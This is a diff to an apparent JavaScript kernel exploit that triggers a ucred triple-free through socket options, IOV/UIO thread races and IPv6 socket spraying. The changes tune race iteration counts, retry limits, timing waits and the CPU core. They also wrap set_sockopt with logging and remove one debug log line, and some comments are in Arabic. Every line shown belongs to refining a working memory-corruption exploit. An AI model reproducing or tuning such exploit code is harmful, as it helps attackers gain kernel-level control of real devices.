@@ -117,11 +117,11 @@ var MSG_IOV_NUM = 0x17; // 23
 var IPV6_SOCK_NUM = 96;
 var IOV_THREAD_NUM = 8;
 var UIO_THREAD_NUM = 8;
-var MAIN_LOOP_ITERATIONS = 7;
-var TRIPLEFREE_ITERATIONS = 7;
-var MAX_ROUNDS_TWIN = 20;
-var MAX_ROUNDS_TRIPLET = 200;
-var MAIN_CORE = 0;
+var MAIN_LOOP_ITERATIONS = 5;
+var TRIPLEFREE_ITERATIONS = 5;
+var MAX_ROUNDS_TWIN = 5;
+var MAX_ROUNDS_TRIPLET = 150;
+var MAIN_CORE = 4;
 var MAIN_RTPRIO = 0x100;
 var RTP_LOOKUP = 0;
 var RTP_SET = 1;
@@ -213,6 +213,20 @@ function set_sockopt(sd, level, optname, optval, optlen) {
   }
   return result;
 }
+var real_set_sockopt = set_sockopt;
+
+set_sockopt = function(sd, level, optname, optval, optlen) {
+  log("[SETSOCKOPT] BEFORE sd=" + sd + 
+      " level=" + level + 
+      " optname=" + optname + 
+      " optlen=" + optlen);
+
+  var ret = real_set_sockopt(sd, level, optname, optval, optlen);
+
+  log("[SETSOCKOPT] AFTER ret=" + ret);
+
+  return ret;
+};
 
 // Global buffer to minimize footprint
 var sockopt_len_ptr = malloc(4);
@@ -1388,7 +1402,7 @@ function remove_uaf_file() {
 }
 // ثوابت بدل الأرقام السحرية
 var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 24;
-var TRIPLEFREE_REFCOUNT_MAX_WAIT = 3000;
+var TRIPLEFREE_REFCOUNT_MAX_WAIT = 2400;
 
 function trigger_ucred_triplefree() {
   log("[TRIGGER] enter trigger_ucred_triplefree");
@@ -1435,7 +1449,6 @@ function trigger_ucred_triplefree() {
     // 6) محاولة إصلاح refcount بشكل خفيف
     log("[TRIGGER] step 6: refcount fix loop start, loops=" + TRIPLEFREE_REFCOUNT_FIX_LOOPS);
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
-      log("[TRIGGER]   fix_loop i=" + i);
       trigger_iov_recvmsg();
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
